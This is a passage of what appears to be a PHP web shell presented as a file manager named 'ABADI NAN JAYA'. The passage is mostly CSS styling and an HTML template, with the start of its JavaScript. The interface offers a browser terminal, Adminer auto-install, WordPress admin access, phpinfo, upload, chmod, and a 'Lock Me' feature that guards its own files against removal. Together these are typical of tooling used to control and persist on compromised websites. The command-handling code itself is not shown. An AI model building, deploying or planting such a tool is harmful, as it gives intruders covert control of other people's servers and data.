  cursor: pointer;
  user-select: none;
  width: 100%;
  box-sizing: border-box;
  border: 0;
  color: inherit;
  font: inherit;
  text-align: left;
}
.kernel-bar-head:hover { background: rgba(192, 240, 0, 0.08); }
.kernel-bar-head:focus-visible {
  outline: 1px solid var(--primary);
  outline-offset: -2px;
}
.kernel-badge {
  flex-shrink: 0;
  font-size: 9px;
  font-weight: 800;
  letter-spacing: .12em;
  text-transform: uppercase;
  color: #0a1000;
  background: linear-gradient(135deg, #9ad400, #c0f000);
  padding: 4px 8px;
  border-radius: 5px;
  box-shadow: 0 0 10px var(--glow);
}
.kernel-bar-head .kernel-title {
  font-size: 11px;
  font-weight: 650;
  color: var(--muted);
  letter-spacing: .02em;
  flex: 1;
  min-width: 0;
}
.kernel-toggle {
  flex-shrink: 0;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 26px;
  height: 26px;
  border-radius: 6px;
  border: 1px solid rgba(192, 240, 0, 0.22);
  background: rgba(0, 0, 0, 0.25);
  color: var(--primary);
  transition: transform .18s ease, background .15s ease, border-color .15s ease;
}
.kernel-bar-head:hover .kernel-toggle {
  border-color: rgba(192, 240, 0, 0.45);
  background: rgba(192, 240, 0, 0.1);
}
.kernel-toggle svg {
  width: 14px;
  height: 14px;
  display: block;
  transition: transform .18s ease;
}
.kernel-bar.is-collapsed .kernel-bar-head { border-bottom: 0; }
.kernel-bar.is-collapsed .kernel-toggle svg { transform: rotate(-90deg); }
.kernel-table {
  display: flex;
  flex-direction: column;
  width: 100%;
  min-width: 0;
  overflow: hidden;
  max-height: 2000px;
  opacity: 1;
  transition: max-height .22s ease, opacity .18s ease;
}
.kernel-bar.is-collapsed .kernel-table {
  max-height: 0;
  opacity: 0;
  pointer-events: none;
}
.kernel-row {
  display: grid;
  grid-template-columns: 88px minmax(0, 1fr);
  gap: 10px;
  align-items: start;
  padding: 7px var(--pad-x);
  border-bottom: 1px solid rgba(36, 48, 22, 0.55);
  min-width: 0;
}
.kernel-row:last-child { border-bottom: 0; }
.kernel-row:nth-child(even) { background: rgba(0, 0, 0, 0.18); }
.kernel-row:hover { background: rgba(192, 240, 0, 0.05); }
.kernel-row .kk {
  font-size: 10px;
  font-weight: 800;
  letter-spacing: .08em;
  text-transform: uppercase;
  color: var(--muted2);
  padding-top: 1px;
  line-height: 1.4;
}
.kernel-row .kv {
  font-family: var(--mono);
  font-size: 12px;
  font-weight: 500;
  color: var(--text);
  line-height: 1.45;
  word-break: break-word;
  overflow-wrap: anywhere;
  min-width: 0;
}
.kernel-row.row-uname .kv {
  color: var(--primary);
  font-size: 12px;
  font-weight: 600;
}
.kernel-row.row-os .kv,
.kernel-row.row-kernel .kv { color: var(--primary); }
.kernel-row.row-cpu .kv { color: var(--accent); }
.kernel-row.row-php .kv { color: #b8e060; }
@media (max-width: 560px) {
  .kernel-row {
    grid-template-columns: 72px minmax(0, 1fr);
    gap: 8px;
    padding: 6px var(--pad-x);
  }
  .kernel-row .kk { font-size: 9px; }
  .kernel-row .kv { font-size: 11px; }
}

/* ===== Tools ===== */
.tools-bar {
  display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
  padding: 10px var(--pad-x);
  background: linear-gradient(180deg, #0b1207 0%, var(--bg2) 100%);
  border-bottom: 1px solid var(--border);
}
.tools-bar .tools-label {
  font-size: 10px; font-weight: 800; letter-spacing: .14em; text-transform: uppercase;
  color: #0a1000;
  background: linear-gradient(135deg, var(--primary), var(--accent));
  padding: 6px 11px; border-radius: 7px;
  box-shadow: 0 0 12px var(--glow);
  margin-right: 4px;
}
.tool-btn.lock-on {
  border-color: rgba(248, 113, 113, 0.55) !important;
  color: #fecaca !important;
  background: rgba(248, 113, 113, 0.12) !important;
  box-shadow: 0 0 12px rgba(248, 113, 113, 0.15);
}
.tool-btn.lock-on:hover {
  border-color: rgba(248, 113, 113, 0.8) !important;
  background: rgba(248, 113, 113, 0.18) !important;
}
.tool-btn {
  display: inline-flex; align-items: center; gap: 6px;
  height: 34px; padding: 0 13px; border-radius: 9px;
  font-size: 12px; font-weight: 650; letter-spacing: .01em;
  border: 1px solid var(--border);
  background: var(--panel);
  color: var(--muted);
  transition: .14s ease;
}
.tool-btn:hover {
  border-color: rgba(192,240,0,.5);
  background: rgba(192,240,0,.1);
  color: var(--primary);
  box-shadow: 0 0 14px var(--glow);
}

/* ===== PWD ===== */
.pwd-bar {
  display: flex; align-items: center; gap: 10px;
  padding: 10px var(--pad-x);
  background: var(--bg2);
  border-bottom: 1px solid var(--border);
  min-width: 0;
}
.pwd-label {
  flex-shrink: 0;
  font-size: 10px; font-weight: 800; letter-spacing: .12em;
  text-transform: uppercase;
  background: linear-gradient(135deg, var(--primary), var(--accent));
  color: #0a1000;
  padding: 6px 10px; border-radius: 7px;
  box-shadow: 0 0 10px var(--glow);
}
.pwd-path {
  flex: 1; min-width: 0;
  display: flex; align-items: center; flex-wrap: wrap; gap: 2px;
  padding: 4px 6px;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 10px;
  min-height: 38px;
}
.pwd-path:hover { border-color: var(--border2); }
.pwd-seg {
  display: inline-flex; align-items: center;
  max-width: 100%;
  padding: 5px 9px; border-radius: 7px;
  color: var(--muted);
  font-family: var(--mono); font-size: 12.5px; font-weight: 500;
  cursor: pointer; border: 0; background: transparent;
  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  transition: .12s ease;
}
.pwd-seg:hover { background: rgba(192,240,0,.12); color: var(--primary); }
.pwd-seg.current {
  color: var(--text);
  font-weight: 700;
  background: transparent;
  box-shadow: none;
  cursor: default;
  padding-left: 4px;
  padding-right: 4px;
}
.pwd-seg.current:hover {
  background: transparent;
  color: var(--text);
}
.pwd-sep {
  color: var(--muted2); font-family: var(--mono); font-size: 12px;
  user-select: none; padding: 0 1px; flex-shrink: 0;
}

/* ===== Toolbar ===== */
.toolbar {
  display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
  padding: 10px var(--pad-x);
  background: var(--panel);
  border-bottom: 1px solid var(--border);
}
.toolbar .spacer { flex: 1; min-width: 8px; }
.search-wrap { position: relative; width: min(260px, 100%); }
.search-wrap input {
  width: 100%; height: 36px; padding: 0 12px 0 36px;
  background: var(--bg); border: 1px solid var(--border); border-radius: 9px;
  outline: none; transition: .15s; color: var(--text);
}
.search-wrap input::placeholder { color: var(--muted2); }
.search-wrap input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px var(--glow); }
.search-wrap svg {
  position: absolute; left: 11px; top: 50%; transform: translateY(-50%);
  width: 15px; height: 15px; color: var(--muted2); pointer-events: none;
}

.sel-bar {
  display: none; align-items: center; gap: 8px; flex-wrap: wrap;
  padding: 8px var(--pad-x);
  background: rgba(192,240,0,.07);
  border-bottom: 1px solid rgba(192,240,0,.18);
  font-size: 13px;
}
.sel-bar.show { display: flex; }
.sel-bar strong { color: var(--primary); font-weight: 700; }

/* ===== Table ===== */
.table-wrap { flex: 1; overflow: auto; min-height: 0; position: relative; background: var(--bg); }
table.fm { width: 100%; border-collapse: collapse; table-layout: fixed; }
table.fm thead th {
  position: sticky; top: 0; z-index: 5;
  background: linear-gradient(180deg, #121a0c 0%, var(--panel2) 100%);
  text-align: left; font-size: 10px; font-weight: 800;
  letter-spacing: .1em; text-transform: uppercase; color: var(--primary);
  padding: 12px 14px;
  border-bottom: 1px solid rgba(192,240,0,.2);
  user-select: none;
}
table.fm thead th.sortable { cursor: pointer; }
table.fm thead th.sortable:hover { color: var(--accent); }
table.fm tbody tr {
  height: var(--row-h);
  border-bottom: 1px solid rgba(30,44,18,.55);
  transition: background .1s;
}
table.fm tbody tr:hover { background: rgba(192,240,0,.04); }
table.fm tbody tr.selected { background: rgba(192,240,0,.09); }
table.fm tbody tr.selected:hover { background: rgba(192,240,0,.12); }
table.fm td {
  padding: 0 14px; vertical-align: middle;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.col-check { width: 48px; }
.col-name { width: auto; }
.col-size { width: 100px; }
.col-mtime { width: 148px; }
.col-perms { width: 120px; }
.col-actions { width: 168px; }
@media (max-width: 1100px) {
  .col-perms, .col-mtime { display: none; }
  .col-actions { width: 120px; }
}
@media (max-width: 800px) {
  .col-size { display: none; }
  .col-actions { width: 96px; }
  .brand small, .pwd-label, .tools-label { display: none; }
  .brand-logo { height: 36px; }
  :root { --pad-x: 12px; }
}

.chk { width: 15px; height: 15px; accent-color: var(--primary2); cursor: pointer; }
.name-cell {
  display: flex; align-items: center; gap: 12px; min-width: 0; height: var(--row-h);
}
.name-cell .ico {
  width: 32px; height: 32px; border-radius: 9px; flex-shrink: 0;
  display: grid; place-items: center;
  background: rgba(192,240,0,.1);
  border: 1px solid rgba(192,240,0,.12);
}
.name-cell .ico.file {
  background: rgba(240,208,0,.08);
  border-color: rgba(240,208,0,.12);
}
.name-cell .ico svg { width: 16px; height: 16px; }
.name-cell .ico.dir svg { color: var(--dir); }
.name-cell .ico.file svg { color: var(--file); }
.name-cell .label {
  min-width: 0; overflow: hidden; text-overflow: ellipsis;
  font-weight: 550; cursor: pointer;
}
.name-cell .label:hover { color: var(--primary); }
.mono { font-family: var(--mono); font-size: 12px; color: var(--muted); }
.row-acts { display: flex; gap: 2px; justify-content: flex-end; opacity: .55; }
tr:hover .row-acts, tr.selected .row-acts { opacity: 1; }
.icon-btn {
  width: 32px; height: 32px; border-radius: 8px;
  display: grid; place-items: center; color: var(--muted);
  transition: .12s;
}
.icon-btn:hover { background: rgba(192,240,0,.1); color: var(--primary); }
.icon-btn.danger:hover { background: rgba(255,69,69,.12); color: #ff7a7a; }
.icon-btn svg { width: 15px; height: 15px; }

.empty {
  display: none;
  flex-direction: column; align-items: center; justify-content: center;
  gap: 12px; padding: 64px 20px; color: var(--muted);
  position: absolute; inset: 0; z-index: 2;
  pointer-events: none;
  background: rgba(0,0,0,.25);
}
.empty:not([hidden]) {
  display: flex;
  pointer-events: auto;
}
.empty[hidden] {
  display: none !important;
}
.empty svg { width: 48px; height: 48px; opacity: .35; color: var(--primary); }

/* ===== Status ===== */
.status {
  display: flex; align-items: center; gap: 14px;
  padding: 8px var(--pad-x);
  background: linear-gradient(180deg, var(--panel) 0%, #040604 100%);
  border-top: 1px solid var(--border);
  font-size: 12px; color: var(--muted);
}
.status .dot {
  width: 8px; height: 8px; border-radius: 50%;
  background: var(--primary);
  box-shadow: 0 0 10px var(--primary);
  animation: pulse-dot 2s ease-in-out infinite;
}
@keyframes pulse-dot {
  0%, 100% { opacity: 1; transform: scale(1); }
  50% { opacity: .55; transform: scale(.85); }
}

.drop-overlay {
  display: none; position: absolute; inset: 8px; z-index: 20;
  background: rgba(192,240,0,.08);
  border: 2px dashed var(--primary);
  border-radius: 12px;
  align-items: center; justify-content: center;
  font-weight: 700; color: var(--primary); pointer-events: none;
  letter-spacing: .04em;
}
.table-wrap.dragging .drop-overlay { display: flex; }

/* ===== Modal ===== */
.modal-bg {
  position: fixed; inset: 0; z-index: 100;
  background: rgba(0,0,0,.78); backdrop-filter: blur(8px);
  display: none; align-items: center; justify-content: center; padding: 16px;
}
.modal-bg.show { display: flex; }
.modal {
  width: min(520px, 100%);
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 16px;
  box-shadow: var(--shadow), 0 0 0 1px rgba(192,240,0,.08);
  overflow: hidden;
  animation: pop .18s ease;
  max-height: min(92dvh, 900px);
  display: flex; flex-direction: column;
}
.modal.wide { width: min(900px, 100%); height: min(80dvh, 720px); max-height: min(92dvh, 900px); }
@keyframes pop {
  from { opacity: 0; transform: translateY(10px) scale(.98); }
  to { opacity: 1; transform: none; }
}
.modal-head {
  display: flex; align-items: center; justify-content: space-between; gap: 12px;
  padding: 14px 16px;
  border-bottom: 1px solid var(--border);
  background: linear-gradient(180deg, rgba(192,240,0,.07) 0%, transparent 100%);
  flex-shrink: 0;
}
.modal-head h2 {
  font-size: 14px; font-weight: 700; letter-spacing: .02em;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0;
}
.modal-head .icon-btn {
  flex-shrink: 0; width: 34px; height: 34px; border-radius: 8px; color: var(--muted);
}
.modal-head .icon-btn:hover { background: rgba(255,69,69,.12); color: #ff7a7a; }
.modal-body { padding: 18px; overflow: auto; min-height: 0; flex: 1; }
.modal.wide .modal-body {
  flex: 1; display: flex; flex-direction: column;
  padding: 0; min-height: 0; overflow: hidden;
}
.modal-foot {
  display: flex; justify-content: flex-end; align-items: center; gap: 8px;
  padding: 12px 16px;
  border-top: 1px solid var(--border);
  background: var(--bg2);
  flex-shrink: 0;
}
.modal.wide.term-mode .modal-foot { display: none; }

.field { margin-bottom: 14px; }
.field label {
  display: block; font-size: 11px; font-weight: 700; color: var(--muted);
  margin-bottom: 7px; letter-spacing: .04em; text-transform: uppercase;
}
.field input, .field select, .field textarea {
  width: 100%; padding: 11px 12px;
  background: var(--bg); border: 1px solid var(--border); border-radius: 9px; outline: none;
}
.field input:focus, .field select:focus, .field textarea:focus {
  border-color: var(--primary); box-shadow: 0 0 0 3px var(--glow);
}
.field .hint { font-size: 11px; color: var(--muted2); margin-top: 5px; }

.editor {
  flex: 1; width: 100%; min-height: 0; resize: none;
  padding: 16px 18px; border: 0; outline: none;
  background: #050805; color: #e8f5c8;
  font-family: var(--mono); font-size: 13px; line-height: 1.65;
  tab-size: 4;
}
.editor-bar {
  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
  padding: 10px 14px; border-bottom: 1px solid var(--border);
  background: var(--bg2); font-size: 12px; color: var(--muted);
}
.chmod-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 8px; }
.chmod-box {
  background: var(--bg); border: 1px solid var(--border); border-radius: 10px; padding: 12px;
}
.chmod-box h4 {
  font-size: 11px; color: var(--muted); margin-bottom: 8px;
  text-transform: uppercase; letter-spacing: .06em;
}
.chmod-box label {
  display: flex; align-items: center; gap: 8px;
  padding: 4px 0; font-size: 13px; font-weight: 500; color: var(--text); cursor: pointer;
}
.presets { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
.preset {
  padding: 6px 10px; border-radius: 7px; font-size: 12px; font-weight: 600;
  background: var(--bg); border: 1px solid var(--border); color: var(--muted);
}
.preset:hover { border-color: var(--primary); color: var(--primary); }
.folder-picker {
  max-height: 280px; overflow: auto;
  border: 1px solid var(--border); border-radius: 10px; background: var(--bg);
}
.fp-item {
  display: flex; align-items: center; gap: 8px;
  padding: 9px 12px; cursor: pointer;
  border-bottom: 1px solid rgba(30,44,18,.5); font-size: 13px;
}
.fp-item:hover { background: rgba(192,240,0,.05); }
.fp-item.picked { background: rgba(192,240,0,.12); color: var(--primary); }
.fp-item svg { width: 16px; height: 16px; color: var(--dir); }

/* ===== Tools panels ===== */
.tool-panel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
@media (max-width: 720px) { .tool-panel-grid { grid-template-columns: 1fr; } }
.term-out, .codec-out {
  width: 100%; min-height: 200px; max-height: 45vh; resize: vertical;
  padding: 12px 14px; border-radius: 10px;
  background: #040604; border: 1px solid var(--border);
  font-family: var(--mono); font-size: 12px; line-height: 1.55;
  color: #c8f08a; outline: none;
}
.term-in {
  width: 100%; padding: 10px 12px; border-radius: 9px;
  background: var(--bg); border: 1px solid var(--border);
  font-family: var(--mono); font-size: 13px; outline: none;
}
.term-in:focus, .term-out:focus, .codec-out:focus {
  border-color: var(--primary); box-shadow: 0 0 0 3px var(--glow);
}
.term-shell {
  display: flex; flex-direction: column;
  flex: 1; min-height: 0; height: 100%; background: #050805;
}
.term-bar {
  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
  padding: 10px 14px;
  background: linear-gradient(180deg, #10180a 0%, #0a1006 100%);
  border-bottom: 1px solid var(--border); flex-shrink: 0;
}
.term-bar-badge {
  flex-shrink: 0; font-size: 10px; font-weight: 800; letter-spacing: .1em;
  text-transform: uppercase; color: #0a1000;
  background: linear-gradient(135deg, var(--primary), var(--accent));
  padding: 5px 9px; border-radius: 6px; box-shadow: 0 0 10px var(--glow);
}
.term-bar-path {
  flex: 1; min-width: 0;
  font-family: var(--mono); font-size: 12px; font-weight: 500; color: var(--muted);
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  padding: 7px 11px; background: rgba(0,0,0,.4);
  border: 1px solid var(--border); border-radius: 8px;
}
.term-bar-hint { flex-shrink: 0; font-size: 11px; color: var(--muted2); font-family: var(--mono); }
.term-screen {
  flex: 1; min-height: 0; display: flex; flex-direction: column;
  margin: 12px 14px 0; border: 1px solid var(--border); border-radius: 12px;
  overflow: hidden; background: #020402;
  box-shadow: inset 0 0 40px rgba(0,0,0,.5);
}
.term-screen .term-out {
  flex: 1; min-height: 0; max-height: none; height: 100%;
  margin: 0; border: 0; border-radius: 0; resize: none;
  padding: 14px 16px; background: transparent; color: #c8f08a;
  font-size: 12.5px; line-height: 1.6; white-space: pre-wrap; word-break: break-word;
}
.term-screen .term-out::placeholder { color: #3a4a2a; }
.term-cmd {
  display: flex; align-items: center; gap: 0; flex-shrink: 0;
  margin: 10px 14px 14px; border: 1px solid var(--border);
  border-radius: 12px; background: #0a1006; overflow: hidden;
  transition: border-color .15s, box-shadow .15s;
}
.term-cmd:focus-within {
  border-color: rgba(192,240,0,.5); box-shadow: 0 0 0 3px var(--glow);
}
.term-prompt {
  flex-shrink: 0; padding: 0 4px 0 14px;
  font-family: var(--mono); font-size: 14px; font-weight: 800;
  color: var(--primary); text-shadow: 0 0 8px var(--glow); user-select: none;
}
.term-cmd .term-in {
  flex: 1; min-width: 0; border: 0; border-radius: 0;
  background: transparent; padding: 14px 10px; font-size: 13.5px;
  color: var(--text); box-shadow: none !important;
}
.term-cmd .term-in:focus { box-shadow: none !important; border: 0; }
.term-cmd .btn {
  height: 100%; min-height: 48px; border-radius: 0;
  border: 0; border-left: 1px solid var(--border); padding: 0 18px;
}
.codec-actions { display: flex; flex-wrap: wrap; gap: 6px; margin: 8px 0; }
.codec-actions button {
  padding: 7px 11px; border-radius: 7px; font-size: 11px; font-weight: 700;
  border: 1px solid var(--border); background: var(--bg); color: var(--muted); cursor: pointer;
  transition: .12s;
}
.codec-actions button:hover { border-color: var(--primary); color: var(--primary); background: rgba(192,240,0,.08); }
.sys-grid { display: grid; grid-template-columns: 140px 1fr; gap: 8px 14px; font-size: 13px; }
.sys-grid .k { color: var(--muted); font-weight: 600; }
.sys-grid .v { font-family: var(--mono); font-size: 12px; word-break: break-all; color: var(--text); }
.phpinfo-frame { width: 100%; height: min(70vh, 640px); border: 0; border-radius: 10px; background: #fff; }
.time-row { display: flex; gap: 8px; flex-wrap: wrap; align-items: end; }

/* ===== Toast / Ctx ===== */
.toasts {
  position: fixed; right: 16px; bottom: 16px; z-index: 200;
  display: flex; flex-direction: column; gap: 8px;
  max-width: min(360px, calc(100vw - 32px));
}
.toast {
  padding: 12px 14px; border-radius: 11px;
  background: var(--panel2); border: 1px solid var(--border);
  box-shadow: var(--shadow); font-size: 13px; font-weight: 500;
  animation: slideIn .2s ease;
  display: flex; align-items: flex-start; gap: 10px;
}
.toast.ok { border-color: rgba(156,255,46,.35); box-shadow: 0 8px 24px rgba(0,0,0,.4), 0 0 20px rgba(192,240,0,.08); }
.toast.err { border-color: rgba(255,69,69,.4); }
.toast .t-close { margin-left: auto; color: var(--muted2); padding: 0 2px; }
@keyframes slideIn {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: none; }
}
.ctx {
  position: fixed; z-index: 150; min-width: 200px;
  background: var(--panel2); border: 1px solid var(--border);
  border-radius: 12px; padding: 6px; box-shadow: var(--shadow);
  display: none;
}
.ctx.show { display: block; animation: pop .12s ease; }
.ctx button {
  width: 100%; display: flex; align-items: center; gap: 10px;
  padding: 9px 12px; border-radius: 8px; text-align: left;
  font-size: 13px; font-weight: 500; color: var(--text);
}
.ctx button:hover { background: rgba(192,240,0,.1); color: var(--primary); }
.ctx button.danger { color: #ff7a7a; }
.ctx button.danger:hover { background: rgba(255,69,69,.12); }
.ctx hr { border: 0; border-top: 1px solid var(--border); margin: 4px 0; }
.ctx svg { width: 15px; height: 15px; color: var(--muted); }
.ctx kbd {
  margin-left: auto; font-size: 10px; color: var(--muted2);
  font-family: var(--mono); background: var(--bg); padding: 2px 5px; border-radius: 4px;
}
.loading-bar {
  position: absolute; top: 0; left: 0; height: 2px; width: 0;
  background: linear-gradient(90deg, var(--primary), var(--accent));
  z-index: 40; transition: width .25s; opacity: 0;
}
.loading-bar.on { opacity: 1; width: 70%; }
.loading-bar.done { width: 100%; opacity: 0; transition: width .2s, opacity .4s .15s; }

@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after { animation: none !important; transition: none !important; }
}


/* Settings panel */
.set-wrap { padding: 16px 18px; overflow: auto; max-height: 100%; }
.set-hero {
  display: flex; align-items: flex-start; gap: 12px; flex-wrap: wrap;
  padding: 14px 16px; margin-bottom: 16px;
  border-radius: 12px;
  background: linear-gradient(135deg, rgba(192,240,0,.1), rgba(240,208,0,.06));
  border: 1px solid rgba(192,240,0,.2);
}
.set-hero strong { color: var(--primary); font-size: 13px; letter-spacing: .04em; }
.set-hero p { margin: 4px 0 0; font-size: 12px; color: var(--muted); line-height: 1.45; }
.set-modes {
  display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;
  margin-bottom: 16px;
}
@media (max-width: 640px) { .set-modes { grid-template-columns: 1fr; } }
.set-mode {
  position: relative;
  display: block; cursor: pointer;
  padding: 14px 14px 14px 42px;
  border-radius: 12px;
  border: 1px solid var(--border);
  background: var(--bg);
  transition: .15s ease;
}
.set-mode:hover { border-color: var(--border2); background: rgba(192,240,0,.04); }
.set-mode.active {
  border-color: rgba(192,240,0,.55);
  background: rgba(192,240,0,.1);
  box-shadow: 0 0 0 1px rgba(192,240,0,.15), 0 0 16px var(--glow);
}
.set-mode input {
  position: absolute; left: 14px; top: 16px;
  accent-color: var(--primary2);
}
.set-mode .t { display: block; font-weight: 700; font-size: 13px; color: var(--text); margin-bottom: 4px; }
.set-mode .d { display: block; font-size: 11px; color: var(--muted2); line-height: 1.4; }
.set-section {
  display: none;
  padding: 14px;
  margin-bottom: 12px;
  border-radius: 12px;
  border: 1px solid var(--border);
  background: var(--bg2);
}
.set-section.on { display: block; animation: pop .15s ease; }
.set-section h3 {
  font-size: 11px; font-weight: 800; letter-spacing: .08em;
  text-transform: uppercase; color: var(--primary);
  margin: 0 0 12px;
}
.set-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
@media (max-width: 640px) { .set-grid { grid-template-columns: 1fr; } }
.set-toggles { display: flex; flex-direction: column; gap: 10px; margin-top: 4px; }
.set-toggle {
  display: flex; align-items: flex-start; gap: 10px;
  padding: 12px; border-radius: 10px;
  border: 1px solid var(--border); background: var(--bg);
  cursor: pointer;
}
.set-toggle:hover { border-color: var(--border2); }
.set-toggle input { margin-top: 2px; accent-color: var(--primary2); }
.set-toggle .t { font-weight: 650; font-size: 13px; color: var(--text); }
.set-toggle .d { font-size: 11px; color: var(--muted2); margin-top: 2px; }

</style>
</head>
<body>
<div class="app" id="app">
  <header class="topbar">
    <div class="brand">
      <img class="brand-logo" src="<?= htmlspecialchars($fmLogoUri) ?>" alt="<?= htmlspecialchars($fmName) ?>" width="320" height="107">
      <div class="brand-meta">
        <h1>ABADI NAN JAYA</h1>
        <small>v<?= htmlspecialchars($fmVer) ?> · file manager</small>
      </div>
    </div>
    <?php if ($hasPass === '1'): ?>
    <a class="btn btn-ghost" href="?logout=1" title="Logout" style="margin-left:auto"><?= icon('logout') ?></a>
    <?php endif; ?>
  </header>

  <div class="main">
    <section class="content">

      <?php
        $kRowOrder = array(
          'uname'  => 'uname',
          'os'     => 'OS',
          'kernel' => 'Kernel',
          'arch'   => 'Arch',
          'host'   => 'Host',
          'cpu'    => 'CPU',
          'load'   => 'Load',
          'uptime' => 'Uptime',
          'user'   => 'User',
          'php'    => 'PHP',
          'server' => 'Server',
        );
        $kUnameShow = !empty($fmKernel['uname'])
          ? $fmKernel['uname']
          : trim($fmKernel['os'] . ' ' . $fmKernel['release'] . ' ' . $fmKernel['machine']);
      ?>
      <div class="kernel-bar" id="kernelBar" title="Kernel &amp; OS info">
        <button type="button" class="kernel-bar-head" id="kernelToggle" aria-expanded="true" aria-controls="kernelTable" title="Show / hide system info">
          <span class="kernel-badge">Kernel</span>
          <span class="kernel-title">System information</span>
          <span class="kernel-toggle" aria-hidden="true">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
          </span>
        </button>
        <div class="kernel-table" id="kernelTable">
          <?php foreach ($kRowOrder as $key => $label):
            if ($key === 'uname') {
              $val = $kUnameShow;
            } else {
              if (empty($fmKernel['lines'][$key])) continue;
              $val = $fmKernel['lines'][$key];
            }
            if ($val === '' || $val === null) continue;
          ?>
          <div class="kernel-row row-<?= htmlspecialchars($key) ?>">
            <div class="kk"><?= htmlspecialchars($label) ?></div>
            <div class="kv" <?= $key === 'uname' ? 'id="kernelUname"' : '' ?> title="<?= htmlspecialchars($val) ?>"><?= htmlspecialchars($val) ?></div>
          </div>
          <?php endforeach; ?>
        </div>
      </div>

      <div class="tools-bar" id="toolsBar">
        <span class="tools-label">Tools</span>
        <button type="button" class="tool-btn" id="toolTerminal" title="Terminal">Terminal</button>
        <button type="button" class="tool-btn" id="toolCodec" title="Encode &amp; Decode">Encode / Decode</button>
        <button type="button" class="tool-btn" id="toolAdminer" title="Buka Adminer (auto install)">Adminer</button>
        <button type="button" class="tool-btn" id="toolSysinfo" title="Server Info">Sysinfo</button>
        <button type="button" class="tool-btn" id="toolPhpinfo" title="PHP Info">PHP Info</button>
        <button type="button" class="tool-btn" id="toolWp" title="WordPress Admin">WP Admin</button>
        <button type="button" class="tool-btn" id="toolLockMe" title="Lock Me — lindungi index.php &amp; abadi_litespeed.php (Linux)">Lock Me</button>
        <button type="button" class="tool-btn" id="toolSettings" title="Settings">Settings</button>
      </div>

      <div class="pwd-bar">
        <span class="pwd-label">PWD</span>
        <div class="pwd-path" id="pwdPath" data-full="<?= htmlspecialchars($fmHomeFull) ?>" title="Klik nama folder untuk pindah"></div>
        <button class="btn btn-ghost" id="btnHome" title="Ke folder file manager"><?= icon('folder') ?> Home</button>
        <button class="btn btn-ghost" id="btnCopyPwd" title="Salin path"><?= icon('copy') ?></button>
      </div>

      <div class="toolbar">
        <button class="btn btn-primary" id="btnAddFile" title="New File"><?= icon('file-plus') ?> <span>File</span></button>
        <button class="btn btn-ghost" id="btnAddFolder" title="New Folder"><?= icon('folder-plus') ?> <span>Folder</span></button>
        <button class="btn btn-ghost" id="btnUpload" title="Upload"><?= icon('upload') ?> <span>Upload</span></button>
        <input type="file" id="fileInput" multiple hidden>
        <div class="spacer"></div>
        <div class="search-wrap">
          <?= icon('search') ?>
          <input type="search" id="search" placeholder="Cari file / folder…" autocomplete="off">
        </div>
      </div>

      <div class="sel-bar" id="selBar">
        <strong id="selCount">0 dipilih</strong>
        <button class="btn btn-ghost" id="btnMove"><?= icon('move') ?> Pindah</button>
        <button class="btn btn-ghost" id="btnCopy"><?= icon('copy') ?> Copy</button>
        <button class="btn btn-warn" id="btnChmod"><?= icon('lock') ?> CHMOD</button>
        <button class="btn btn-ghost" id="btnRenameOne"><?= icon('edit') ?> Rename</button>
        <button class="btn btn-danger" id="btnDelete"><?= icon('trash') ?> Hapus</button>
        <button class="btn btn-ghost" id="btnClearSel">Batal</button>
      </div>

      <div class="table-wrap" id="tableWrap">
        <div class="loading-bar" id="loadingBar"></div>
        <div class="drop-overlay">Lepas file untuk upload ke folder ini</div>
        <table class="fm">
          <thead>
            <tr>
              <th class="col-check"><input type="checkbox" class="chk" id="checkAll" title="Pilih semua"></th>
              <th class="col-name sortable" data-sort="name">Nama</th>
              <th class="col-size sortable" data-sort="size">Ukuran</th>
              <th class="col-mtime sortable" data-sort="mtime">Diubah</th>
              <th class="col-perms sortable" data-sort="chmod">Permission</th>
              <th class="col-actions">Aksi</th>
            </tr>
          </thead>
          <tbody id="tbody"></tbody>
        </table>
        <div class="empty" id="empty" hidden>
          <?= icon('folder', 48) ?>
          <div class="empty-msg">Folder kosong</div>
          <button class="btn btn-primary" id="btnEmptyAdd"><?= icon('folder-plus') ?> Buat folder</button>
        </div>
      </div>
    </section>
  </div>

  <footer class="status">
    <span class="dot" id="statusDot"></span>
    <span id="statusText">Siap</span>
    <span id="statusCount"></span>
  </footer>
</div>

<!-- Context menu -->
<div class="ctx" id="ctx" role="menu"></div>

<!-- Modal shell -->
<div class="modal-bg" id="modalBg" role="dialog" aria-modal="true">
  <div class="modal" id="modal">
    <div class="modal-head">
      <h2 id="modalTitle">Dialog</h2>
      <button class="icon-btn" id="modalClose" aria-label="Tutup"><?= icon('x') ?></button>
    </div>
    <div class="modal-body" id="modalBody"></div>
    <div class="modal-foot" id="modalFoot"></div>
  </div>
</div>

<div class="toasts" id="toasts" aria-live="polite"></div>

<script>
(function () {
  'use strict';

  // always hit same script with ?api=1
  const API = (function () {
    var path = location.pathname || '/';
    // if directory URL, prefer index.php explicitly
    if (path.slice(-1) === '/') path += 'index.php';
    return path + '?api=1';
  })();
  // Lokasi awal = folder file manager; refresh tetap di folder terakhir
  const FM_HOME = <?= json_encode($fmHome, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) ?>;
  const PATH_KEY = 'abadinanjaya_fm_path';
  const state = {
    path: (() => {
      try {
        const s = sessionStorage.getItem(PATH_KEY);
        // null = belum pernah buka → home; '' = valid (root C:\)
        if (s !== null) return s;
      } catch (_) {}
      return FM_HOME;
    })(),
    items: [],
